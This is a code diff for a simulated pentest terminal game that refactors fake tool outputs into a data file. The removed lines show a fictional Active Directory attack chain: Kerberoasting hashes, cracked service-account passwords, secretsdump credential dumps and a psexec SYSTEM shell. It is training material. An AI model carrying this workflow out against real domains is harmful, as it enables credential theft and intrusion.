@@ -1,12 +1,26 @@
 'use strict';
 
+// ── Lab data loaded from data/labs.json ──────────────────────────────────────
+// Populated by loadLabs() before the terminal accepts commands. Handlers
+// reference entries via { linesKey | stepLinesKey | echoKey } and the
+// dispatcher resolves them at run time.
+let LABS = null;
+const LABS_URL = 'data/labs.json';
+
+async function loadLabs() {
+  if (LABS) return LABS;
+  const res = await fetch(LABS_URL, { cache: 'no-cache' });
+  if (!res.ok) throw new Error('labs.json fetch failed: ' + res.status);
+  LABS = await res.json();
+  return LABS;
+}
+
 // ── Simulation state ──────────────────────────────────────────────────────────
 const SIM = {
   cwd: '/home/rembrandt',
   user: 'rembrandt',
   windowsShell: false,
   winCwd: 'C:\\Windows\\system32',
-  hashesOnDisk: false,
   lootExfiltrated: false,
   dirs: new Set(),
   // ── Metasploit state ──────────────────────────────────────────────────────
@@ -70,21 +84,10 @@ function jitter(base, spread) {
 }
 
 function simFiles() {
-  const home = SIM.user === 'root' ? '/root' : ('/home/' + SIM.user);
-  const f = { ...SIM.files };
-  if (SIM.hashesOnDisk) {
-    f[home + '/hashes.kerberoast'] = KRB5_HASHES;
-    f['/home/' + SIM.user + '/hashes.kerberoast'] = KRB5_HASHES;
-    f['/root/hashes.kerberoast'] = KRB5_HASHES;
-  }
-  return f;
+  return { ...SIM.files };
 }
 
 function isRoot() { return SIM.user === 'root'; }
-
-const KRB5_HASHES = `$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f$1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c
-$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6$2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e
-$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7$3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f`;
 
 // ── Command outputs ───────────────────────────────────────────────────────────
 // Each handler: { id, match(cmd), output, lines[] (alt to output), event, after() }
@@ -237,7 +240,6 @@ const HANDLERS = [
       if (cwd === ('/home/' + SIM.user)) {
         dirs  = new Set(['Desktop','Documents','Downloads','Music','Pictures','Public','Templates','Videos']);
         files = ['notes.txt'];
-        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
         dotDirs  = ['.config', '.local', '.ssh', '.msf4'];
         dotFiles = ['.bash_history', '.bash_logout', '.bashrc', '.profile', '.zshrc'];
       } else if (cwd.startsWith('/home/') && cwd.split('/').length === 3 && !cwd.endsWith('/')) {
@@ -294,7 +296,6 @@ const HANDLERS = [
       } else if (cwd === '/root') {
         dirs     = new Set(['Desktop','Documents','Downloads','.msf4','.ssh']);
         files    = ['notes.txt','root.txt','setup.sh'];
-        if (SIM.hashesOnDisk) files.push('hashes.kerberoast');
         dotDirs  = ['.config'];
         dotFiles = ['.bash_history', '.bashrc', '.profile'];
       } else if (cwd === '/root/Desktop') {
@@ -360,7 +361,7 @@ const HANDLERS = [
       } else if (cwd === '/usr') {
         dirs = new Set(['bin','include','lib','lib32','lib64','libexec','local','sbin','share','src']); files = [];
       } else if (cwd === '/usr/bin') {
-        dirs = new Set([]); files = ['awk','base64','crackmapexec','curl','cut','diff','dig','dpkg','enum4linux','env','file','gobuster','gpg','hashcat','head','htop','hydra','impacket-GetUserSPNs','impacket-psexec','impacket-secretsdump','john','kerbrute','less','md5sum','more','nano','netcat','nmap','openssl','perl','python3','python3.11','sha256sum','sort','ssh','ssh-keygen','strace','strings','tail','tcpdump','top','traceroute','uniq','vim','wc','wget','whoami','xxd'];
+        dirs = new Set([]); files = ['awk','base64','crackmapexec','curl','cut','diff','dig','dpkg','enum4linux','env','file','gobuster','gpg','hashcat','head','htop','hydra','impacket-psexec','impacket-secretsdump','john','less','md5sum','more','nano','netcat','nmap','openssl','perl','python3','python3.11','sha256sum','sort','ssh','ssh-keygen','strace','strings','tail','tcpdump','top','traceroute','uniq','vim','wc','wget','whoami','xxd'];
       } else if (cwd === '/usr/sbin') {
         dirs = new Set([]); files = ['adduser','apache2','cron','deluser','dmidecode','groupadd','groupdel','iptables','nft','sshd','tcpdump','useradd','userdel','usermod'];
       } else if (cwd === '/usr/local') {
@@ -434,7 +435,7 @@ const HANDLERS = [
       }
       allDirs.forEach(d  => lines.push(fmt(d, true)));
       allFiles.forEach(f => {
-        const sz = f.endsWith('.kerberoast') ? 3241 : f === 'rockyou.txt' ? 139921507 : 248;
+        const sz = f === 'rockyou.txt' ? 139921507 : 248;
         lines.push(fmt(f, false, sz));
       });
       return lines.join('\n') || '';
@@ -710,7 +711,6 @@ const HANDLERS = [
       // wipe the simulated filesystem
       SIM.files = {};
       SIM.dirs = new Set();
-      SIM.hashesOnDisk = false;
       SIM.cwd = '/';
     },
   },
@@ -811,22 +811,8 @@ const HANDLERS = [
     },
     progressOnEnter: true,
     match: c => /^nmap\b/.test(c) && (c.includes('/24') || c.includes('-sn')),
-    lines: [
-      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
-      { t: 'Nmap scan report for 10.10.10.1', cls: 'b' },
-      { t: 'Host is up (0.00080s latency).' },
-      { t: '' },
-      { t: 'Nmap scan report for 10.10.10.5', cls: 'b' },
-      { t: 'Host is up (0.000082s latency).' },
-      { t: '' },
-      { t: 'Nmap scan report for LEGACY (10.10.10.50)', cls: 'b' },
-      { t: 'Host is up (0.0021s latency).' },
-      { t: '' },
-      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)', cls: 'b' },
-      { t: 'Host is up (0.0015s latency).' },
-      { t: '' },
-      { t: 'Nmap done: 256 IP addresses (4 hosts up) scanned in 2.41 seconds', cls: 'g' },
-    ],
+    linesKey: 'nmap.discovery',
+    lines: [],
   },
     // ── nmap LEGACY (10.10.10.50) ───────────────────────────────────────────────────────────────────────────
   {
@@ -899,36 +885,8 @@ const HANDLERS = [
       ];
     },
     match: c => /^nmap\b/.test(c) && c.includes('10.10.10.10'),
-    lines: [
-      { t: 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
-      { t: 'Nmap scan report for DC01.CORP.LOCAL (10.10.10.10)' },
-      { t: 'Host is up (0.0015s latency).' },
-      { t: 'Not shown: 65514 filtered tcp ports (no-response)' },
-      { t: 'PORT      STATE SERVICE       VERSION' },
-      { t: '53/tcp    open  domain        Simple DNS Plus', cls: 'g' },
-      { t: '80/tcp    open  http          Microsoft IIS httpd 10.0', cls: 'g' },
-      { t: '88/tcp    open  kerberos-sec  Microsoft Windows Kerberos', cls: 'g' },
-      { t: '135/tcp   open  msrpc         Microsoft Windows RPC', cls: 'g' },
-      { t: '139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn', cls: 'g' },
-      { t: '389/tcp   open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
-      { t: '445/tcp   open  microsoft-ds?', cls: 'g' },
-      { t: '464/tcp   open  kpasswd5?', cls: 'g' },
-      { t: '593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0', cls: 'g' },
-      { t: '636/tcp   open  ldapssl?', cls: 'g' },
-      { t: '3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP', cls: 'g' },
-      { t: '5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)', cls: 'g' },
-      { t: '' },
-      { t: 'Host script results:' },
-      { t: '| smb2-security-mode:' },
-      { t: '|   3:1:1:' },
-      { t: '|_    Message signing enabled and required' },
-      { t: '| smb2-time:' },
-      { t: '|   date: 2024-01-15T14:11:47' },
-      { t: '' },
-      { t: 'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows' },
-      { t: '' },
-      { t: 'Nmap done: 1 IP address (1 host up) scanned in 28.41 seconds', cls: 'g' },
-    ],
+    linesKey: 'nmap.full',
+    lines: [],
   },
 
   // ── enum4linux ────────────────────────────────────────────────────────────
@@ -1019,152 +977,12 @@ const HANDLERS = [
     ],
   },
 
-  // ── GetUserSPNs — enumerate (no -request) ────────────────────────────────
-  {
-    id: 'spns-enum',
-    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && !c.includes('-request'),
-    stepLines: [
-      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra', delay: 0 },
-      { t: '', delay: jitter(800, 200) },
-      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon', delay: jitter(1200, 300) },
-      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------', delay: jitter(80, 20) },
-      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g', delay: jitter(300, 80) },
-      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g', delay: jitter(200, 60) },
-      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g', delay: jitter(200, 60) },
-    ],
-    lines: [],
-  },
-
-  // ── GetUserSPNs — request TGS tickets ────────────────────────────────────
-  {
-    id: 'spns-request',
-    match: c => /impacket-GetUserSPNs|GetUserSPNs/.test(c) && c.includes('10.10.10.10') && c.includes('-request'),
-    stepLines: [
-      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra', delay: 0 },
-      { t: '', delay: jitter(800, 200) },
-      { t: 'ServicePrincipalName          Name        MemberOf  PasswordLastSet              LastLogon', delay: jitter(1200, 300) },
-      { t: '----------------------------  ----------  --------  ---------------------------  ---------------------------', delay: jitter(80, 20) },
-      { t: 'backup/dc01.corp.local        svc_backup            2024-01-10 09:15:43.000000   2024-01-14 18:32:17.000000', cls: 'g', delay: jitter(300, 80) },
-      { t: 'MSSQLSvc/dc01.corp.local:1433 svc_sql               2024-01-08 11:22:01.000000   2024-01-13 09:45:22.000000', cls: 'g', delay: jitter(200, 60) },
-      { t: 'HTTP/web.corp.local           svc_web               2024-01-05 14:30:15.000000   2024-01-12 16:20:08.000000', cls: 'g', delay: jitter(200, 60) },
-      { t: '', delay: jitter(600, 150) },
-      { t: '$krb5tgs$23$*svc_backup$CORP.LOCAL$backup/dc01.corp.local*$8a3f2b1c...', cls: 'y', delay: jitter(500, 120) },
-      { t: '$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/dc01.corp.local:1433*$9b4c3d2e...', cls: 'y', delay: jitter(400, 100) },
-      { t: '$krb5tgs$23$*svc_web$CORP.LOCAL$HTTP/web.corp.local*$7c5d4e3f...', cls: 'y', delay: jitter(400, 100) },
-      { t: '', delay: jitter(300, 80) },
-      { t: (c) => c.includes('-outputfile') ? '[*] Saving 3 tickets to hashes.kerberoast' : '', cls: 'b', delay: jitter(200, 50) },
-    ],
-    lines: [],
-    after: (c) => { if (c.includes('-outputfile') || c.includes('hashes.kerberoast')) SIM.hashesOnDisk = true; },
-  },
-
-  // ── john — crack ──────────────────────────────────────────────────────────
-  {
-    id: 'john-crack',
-    loadTime: () => jitter(6500, 1500),
-    match: c => /^john\b/.test(c) && c.includes('hashes') && !c.includes('--show'),
-    progressFn: (elapsed, total) => {
-      const pct = Math.min(99, elapsed / total * 100);
-      const rate = (1200 + Math.random() * 800).toFixed(0);
-      const tried = Math.floor(pct * 140000 / 100).toLocaleString();
-      return [
-        { t: `${(pct).toFixed(2)}g 0:00:00:${String(Math.floor(elapsed/1000)).padStart(2,'0')} ${pct < 99 ? (pct/10).toFixed(4)+'g/s' : 'DONE'} ${rate}p/s ${(parseInt(rate)*3).toLocaleString()}c/s`, cls: 'd' },
-      ];
-    },
-    lines: [
-      { t: 'Using default input encoding: UTF-8' },
-      { t: 'Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])' },
-      { t: 'Will run 4 OpenMP threads' },
-      { t: "Press 'q' or Ctrl-C to abort, almost any other key for status" },
-      { t: '' },
-      { t: 'Backup2023!      (svc_backup)', cls: 'g' },
-      { t: 'SqlServer1!      (svc_sql)', cls: 'g' },
-      { t: 'Welcome123       (svc_web)', cls: 'g' },
-      { t: '' },
-      { t: '3g 0:00:00:23 DONE (2024-01-15 14:18) 0.1298g/s 1865p/s 5595c/s', cls: 'd' },
-      { t: 'Use the "--show" option to display all of the cracked passwords reliably', cls: 'd' },
-      { t: 'Session completed.', cls: 'g' },
-    ],
-  },
-
-  // ── john --show ───────────────────────────────────────────────────────────
-  {
-    match: c => /^john\b/.test(c) && c.includes('--show'),
-    loadTime: () => jitter(400, 100),
-    lines: [
-      { t: 'svc_backup:Backup2023!:CORP.LOCAL:backup/dc01.corp.local:$krb5tgs$23$*svc_backup$...', cls: 'g' },
-      { t: 'svc_sql:SqlServer1!:CORP.LOCAL:MSSQLSvc/dc01.corp.local:1433:$krb5tgs$23$*svc_sql$...', cls: 'g' },
-      { t: 'svc_web:Welcome123:CORP.LOCAL:HTTP/web.corp.local:$krb5tgs$23$*svc_web$...', cls: 'g' },
-      { t: '' },
-      { t: '3 password hashes cracked, 0 left' },
-    ],
-  },
-
-  // ── hashcat ───────────────────────────────────────────────────────────────
-  {
-    id: 'hashcat',
-    loadTime: () => jitter(5500, 1200),
-    match: c => /^hashcat\b/.test(c) && c.includes('13100'),
-    lines: [
-      { t: 'hashcat (v6.2.6) starting...' },
-      { t: '' },
-      { t: 'OpenCL API (OpenCL 3.0 LINUX) - Platform #1 [Intel(R) Corporation]' },
-      { t: '* Device #1: AMD Radeon RX 6800 XT, 16256/16368 MB (4092 MB allocatable), 36MCU' },
-      { t: '' },
-      { t: 'Minimum password length supported by kernel: 0', cls: 'd' },
-      { t: 'Maximum password length supported by kernel: 256', cls: 'd' },
-      { t: '' },
-      { t: 'Hashes: 3 digests; 3 unique digests, 3 unique salts' },
-      { t: 'Bitmaps: 16 bits, 65536 entries' },
-      { t: 'Applicable optimizers applied:' },
-      { t: '* Zero-Byte, Not-Iterated, Single-Version' },
-      { t: '' },
-      { t: 'ATTENTION! Pure (unoptimized) backend kernels selected.', cls: 'y' },
-      { t: '' },
-      { t: '$krb5tgs$23$*svc_backup$...:Backup2023!', cls: 'g' },
-      { t: '$krb5tgs$23$*svc_sql$...:SqlServer1!', cls: 'g' },
-      { t: '$krb5tgs$23$*svc_web$...:Welcome123', cls: 'g' },
-      { t: '' },
-      { t: 'Session..........: hashcat' },
-      { t: 'Status...........: Cracked', cls: 'g' },
-      { t: 'Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)' },
-      { t: 'Time.Started.....: Mon Jan 15 14:18:04 2024 (22 secs)' },
-      { t: 'Speed.#1.........:  3,482.2 kH/s (1.48ms) @ Accel:512 Loops:1 Thr:32 Vec:4' },
-      { t: 'Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new)' },
-      { t: 'Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)' },
-      { t: '' },
-      { t: 'Started: Mon Jan 15 14:18:04 2024', cls: 'd' },
-      { t: 'Stopped: Mon Jan 15 14:18:26 2024', cls: 'd' },
-    ],
-  },
-
   // ── secretsdump ───────────────────────────────────────────────────────────
   {
     id: 'secretsdump',
     match: c => /impacket-secretsdump|secretsdump/.test(c) && c.includes('10.10.10.10'),
-    stepLines: [
-      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra', delay: 0 },
-      { t: '', delay: jitter(600, 150) },
-      { t: '[*] Target system bootKey: 0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d', cls: 'b', delay: jitter(1200, 300) },
-      { t: '[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)', cls: 'b', delay: jitter(800, 200) },
-      { t: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g', delay: jitter(400, 100) },
-      { t: 'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', delay: jitter(200, 50) },
-      { t: '', delay: jitter(500, 120) },
-      { t: '[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)', cls: 'b', delay: jitter(600, 150) },
-      { t: '[*] Using the DRSUAPI method to get NTDS.DIT secrets', cls: 'b', delay: jitter(1400, 400) },
-      { t: 'CORP\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::', cls: 'g', delay: jitter(300, 80) },
-      { t: 'CORP\\Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', delay: jitter(150, 40) },
-      { t: 'CORP\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c:::', delay: jitter(150, 40) },
-      { t: 'CORP\\john.doe:1103:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::', delay: jitter(150, 40) },
-      { t: 'CORP\\svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5:::', cls: 'g', delay: jitter(150, 40) },
-      { t: 'CORP\\svc_sql:1105:aad3b435b51404eeaad3b435b51404ee:f4c5e53a5e66f1c6e1c6d57f6eac2f5a:::', delay: jitter(150, 40) },
-      { t: 'CORP\\svc_web:1106:aad3b435b51404eeaad3b435b51404ee:e10adc3949ba59abbe56e057f20f883e:::', delay: jitter(150, 40) },
-      { t: '', delay: jitter(400, 100) },
-      { t: '[*] Kerberos keys grabbed', cls: 'b', delay: jitter(700, 180) },
-      { t: 'CORP\\Administrator:aes256-cts-hmac-sha1-96:3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4', delay: jitter(200, 50) },
-      { t: '', delay: jitter(300, 80) },
-      { t: '[*] Cleaning up...', cls: 'd', delay: jitter(500, 120) },
-    ],
+    stepLinesKey: 'secretsdump',
+    stepLines: [],
     lines: [],
   },
 
@@ -1172,23 +990,8 @@ const HANDLERS = [
   {
     id: 'psexec',
     match: c => /impacket-psexec|psexec\.py/.test(c) && c.includes('10.10.10.10'),
-    stepLines: [
-      { t: 'Impacket v0.11.0 - Copyright 2023 Fortra',                    delay: 0 },
-      { t: '',                                                             delay: 300 },
-      { t: '[*] Requesting shares on 10.10.10.10.....',   cls: 'b',       delay: jitter(1200, 300) },
-      { t: '[*] Found writable share ADMIN$',             cls: 'g',       delay: jitter(800, 200) },
-      { t: '[*] Uploading file XGaHpFZv.exe',             cls: 'b',       delay: jitter(1400, 400) },
-      { t: '[*] Opening SVCManager on 10.10.10.10.....',  cls: 'b',       delay: jitter(900, 200) },
-      { t: '[*] Creating service oUUL on 10.10.10.10.....',cls: 'b',      delay: jitter(600, 150) },
-      { t: '[*] Starting service oUUL.....',              cls: 'b',       delay: jitter(1100, 300) },
-      { t: '[!] Press help for extra shell commands',     cls: 'y',       delay: jitter(500, 100) },
-      { t: 'Microsoft Windows [Version 10.0.17763.4737]', cls: 'w',      delay: jitter(700, 150) },
-      { t: '(c) 2018 Microsoft Corporation. All rights reserved.', cls: 'd', delay: 100 },
-      { t: '',                                                             delay: 400 },
-      { t: 'C:\\Windows\\system32> whoami',               cls: 'p',       delay: jitter(600, 150) },
-      { t: 'nt authority\\system',                        cls: 'g',       delay: jitter(300, 80) },
-      { t: '',                                                             delay: 200 },
-    ],
+    stepLinesKey: 'psexec',
+    stepLines: [],
     lines: [],
     after: () => { SIM.windowsShell = true; SIM.winCwd = 'C:\\Windows\\system32'; },
   },
@@ -1196,17 +999,8 @@ const HANDLERS = [
   // ── gobuster / dirb ───────────────────────────────────────────────────────
   {
     match: c => /^gobuster\b|^dirb\b|^dirsearch\b/.test(c),
-    lines: [
-      { t: 'Gobuster v3.6', cls: 'b' },
-      { t: 'by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)', cls: 'd' },
-      { t: '' },
-      { t: 'Initializing scan...' },
-      { t: '/index.html           (Status: 200) [Size: 1245]', cls: 'g' },
-      { t: '/images               (Status: 301) [Size: 166]', cls: 'g' },
-      { t: '/admin                (Status: 403) [Size: 291]', cls: 'y' },
-      { t: '' },
-      { t: 'Finished', cls: 'g' },
-    ],
+    linesKey: 'gobuster',
+    lines: [],
   },
 
   // ── rpcclient ─────────────────────────────────────────────────────────────
@@ -1226,16 +1020,8 @@ const HANDLERS = [
   // ── smbclient ─────────────────────────────────────────────────────────────
   {
     match: c => /^smbclient\b/.test(c),
-    lines: [
-      { t: 'Password for [WORKGROUP\\root]:' },
-      { t: '' },
-      { t: '\tSharename       Type      Comment' },
-      { t: '\t---------       ----      -------' },
-      { t: '\tSYSVOL          Disk      Logon server share', cls: 'b' },
-      { t: '\tNETLOGON        Disk      Logon server share', cls: 'b' },
-      { t: '\tIPC$            IPC       Remote IPC', cls: 'd' },
-      { t: 'Reconnecting with SMB1 for workgroup listing.' },
-    ],
+    linesKey: 'smbclient',
+    lines: [],
   },
 
   // ── kerbrute ─────────────────────────────────────────────────────────────
@@ -1333,7 +1119,6 @@ const HANDLERS = [
         bash: '/usr/bin/bash', sh: '/usr/bin/sh', john: '/usr/sbin/john',
         hashcat: '/usr/bin/hashcat', curl: '/usr/bin/curl', wget: '/usr/bin/wget',
         ssh: '/usr/bin/ssh', nc: '/usr/bin/nc', netcat: '/usr/bin/nc',
-        'impacket-GetUserSPNs': '/usr/bin/impacket-GetUserSPNs',
         'impacket-secretsdump': '/usr/bin/impacket-secretsdump',
         'impacket-psexec': '/usr/bin/impacket-psexec',
         crackmapexec: '/usr/bin/crackmapexec', enum4linux: '/usr/bin/enum4linux',
@@ -1355,7 +1140,6 @@ const HANDLERS = [
   {
     match: c => /^find\s/.test(c),
     lines: [{ t: (c) => {
-      if (c.includes('.kerberoast') || c.includes('hash')) return SIM.hashesOnDisk ? '/home/' + SIM.user + '/hashes.kerberoast' : '';
       if (c.includes('wordlist') || c.includes('rockyou')) return '/usr/share/wordlists/rockyou.txt';
       if (c.includes('txt')) return '/home/' + SIM.user + '/notes.txt\n/etc/hosts\n/etc/os-release';
       return '';
@@ -1368,7 +1152,6 @@ const HANDLERS = [
     lines: [{ t: (c) => {
       if (c.includes('root') && c.includes('passwd')) return 'root:x:0:0:root:/root:/bin/bash';
       if (c.includes('kali') && c.includes('passwd')) return '' + SIM.user + ':x:1000:1000:Rembrandt,,,:/home/' + SIM.user + ':/bin/bash';
-      if (c.includes('svc') || c.includes('service')) return 'svc_backup:Backup2023!\nsvc_sql:SqlServer1!\nsvc_web:Welcome123';
       return '';
     }, cls: 'g'}],
   },
@@ -1566,24 +1349,15 @@ const HANDLERS = [
   // ── df ────────────────────────────────────────────────────────────────────
   {
     match: c => /^df(\s|$)/.test(c),
-    lines: [
-      { t: 'Filesystem      Size  Used Avail Use% Mounted on' },
-      { t: '/dev/sda1        50G   18G   30G  38% /', cls: 'g' },
-      { t: 'tmpfs           4.0G     0  4.0G   0% /dev/shm' },
-      { t: 'tmpfs           1.6G  1.2M  1.6G   1% /run' },
-      { t: '/dev/sda2       200G   45G  145G  24% /home', cls: 'g' },
-      { t: 'tmpfs           100M   20K  100M   1% /run/user/1000' },
-    ],
+    linesKey: 'df',
+    lines: [],
   },
 
   // ── free ─────────────────────────────────────────────────────────────────
   {
     match: c => /^free(\s|$)/.test(c),
-    lines: [
-      { t: '               total        used        free      shared  buff/cache   available' },
-      { t: 'Mem:         8388608     2914048     4325632       13312     1148928     5178208', cls: 'b' },
-      { t: 'Swap:        2097152           0     2097152', cls: 'd' },
-    ],
+    linesKey: 'free',
+    lines: [],
   },
 
   // ── ifconfig / ip addr / ip a ─────────────────────────────────────────────
@@ -1607,11 +1381,8 @@ const HANDLERS = [
   // ── ip route ─────────────────────────────────────────────────────────────
   {
     match: c => /^ip\s+r(oute)?/.test(c) || c === 'route -n' || c === 'route',
-    lines: [
-      { t: 'default via 10.10.10.1 dev eth0 proto dhcp metric 100', cls: 'g' },
-      { t: '10.10.10.0/24 dev eth0 proto kernel scope link src 10.10.10.5 metric 100' },
-      { t: '127.0.0.0/8 dev lo proto kernel scope link src 127.0.0.1' },
-    ],
+    linesKey: 'iproute',
+    lines: [],
   },
 
   // ── arp ───────────────────────────────────────────────────────────────────
@@ -1633,12 +1404,8 @@ const HANDLERS = [
   // ── lsb_release ──────────────────────────────────────────────────────────
   {
     match: c => /^lsb_release/.test(c),
-    lines: [
-      { t: 'Distributor ID:\tKali' },
-      { t: 'Description:\tKali GNU/Linux Rolling' },
-      { t: 'Release:\t2024.2' },
-      { t: 'Codename:\tkali-rolling' },
-    ],
+    linesKey: 'lsb_release',
+    lines: [],
   },
 
   // ── w ─────────────────────────────────────────────────────────────────────
@@ -1726,88 +1493,29 @@ const HANDLERS = [
   // ── lscpu ────────────────────────────────────────────────────────────────
   {
     match: c => c === 'lscpu' || /^lscpu\s/.test(c),
-    lines: [
-      { t: 'Architecture:                    x86_64', cls: 'b' },
-      { t: 'CPU op-mode(s):                  32-bit, 64-bit' },
-      { t: 'Address sizes:                   45 bits physical, 48 bits virtual' },
-      { t: 'Byte Order:                      Little Endian' },
-      { t: 'CPU(s):                          4', cls: 'g' },
-      { t: 'On-line CPU(s) list:             0-3' },
-      { t: 'Vendor ID:                       GenuineIntel' },
-      { t: 'BIOS Vendor ID:                  GenuineIntel' },
-      { t: 'Model name:                      Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz', cls: 'g' },
-      { t: 'BIOS Model name:                 Intel(R) Core(TM) i7-10700K CPU @ 3.80GHz  CPU @ 3.8GHz' },
-      { t: 'CPU family:                      6' },
-      { t: 'Model:                           165' },
-      { t: 'Thread(s) per core:              2' },
-      { t: 'Core(s) per socket:              4' },
-      { t: 'Socket(s):                       1' },
-      { t: 'Stepping:                        5' },
-      { t: 'CPU max MHz:                     5100.0000', cls: 'y' },
-      { t: 'CPU min MHz:                     800.0000' },
-      { t: 'BogoMIPS:                        7600.00' },
-      { t: 'Virtualization:                  VT-x', cls: 'c' },
-      { t: 'L1d cache:                       128 KiB (4 instances)' },
-      { t: 'L1i cache:                       128 KiB (4 instances)' },
-      { t: 'L2 cache:                        1 MiB (4 instances)' },
-      { t: 'L3 cache:                        16 MiB (1 instance)', cls: 'g' },
-      { t: 'NUMA node(s):                    1' },
-      { t: 'NUMA node0 CPU(s):               0-3' },
-      { t: 'Vulnerability Itlb multihit:     Not affected' },
-      { t: 'Vulnerability L1tf:              Not affected' },
-      { t: 'Vulnerability Mds:               Not affected' },
-      { t: 'Vulnerability Meltdown:          Not affected' },
-      { t: 'Vulnerability Mmio stale data:   Mitigation; Clear CPU buffers; SMT vulnerable', cls: 'y' },
-      { t: 'Vulnerability Spec store bypass: Mitigation; Speculative Store Bypass disabled via prctl', cls: 'y' },
-      { t: 'Vulnerability Spectre v1:        Mitigation; usercopy/swapgs barriers and __user pointer sanitization', cls: 'y' },
-      { t: 'Vulnerability Spectre v2:        Mitigation; Enhanced / Automatic IBRS; IBPB conditional; RSB filling', cls: 'y' },
-      { t: 'Flags:                           fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx pdpe1gb rdtscp lm constant_tsc art arch_perfmon pebs bts rep_good nopl xtopology nonstop_tsc cpuid aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx smx est tm2 ssse3 sdbg fma cx16 xtpr pdcm pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand lahf_lm abm 3dnowprefetch cpuid_fault epb invpcid_single ssbd ibrs ibpb stibp ibrs_enhanced tpr_shadow vnmi flexpriority ept vpid ept_ad fsgsbase tsc_adjust bmi1 avx2 smep bmi2 erms invpcid mpx rdseed adx smap clflushopt intel_pt xsaveopt xsavec xgetbv1 xsaves dtherm ida arat pln pts hwp hwp_notify hwp_act_window hwp_epp md_clear flush_l1d arch_capabilities', cls: 'd' },
-    ],
+    linesKey: 'lscpu',
+    lines: [],
   },
 
   // ── lsblk ─────────────────────────────────────────────────────────────────
   {
     match: c => /^lsblk(\s|$)/.test(c),
-    lines: [
-      { t: 'NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS' },
-      { t: 'sda           8:0    0    50G  0 disk ', cls: 'b' },
-      { t: '├─sda1        8:1    0    48G  0 part /', cls: 'g' },
-      { t: '└─sda2        8:2    0     2G  0 part [SWAP]', cls: 'd' },
-      { t: 'sr0          11:0    1  1024M  0 rom  ', cls: 'd' },
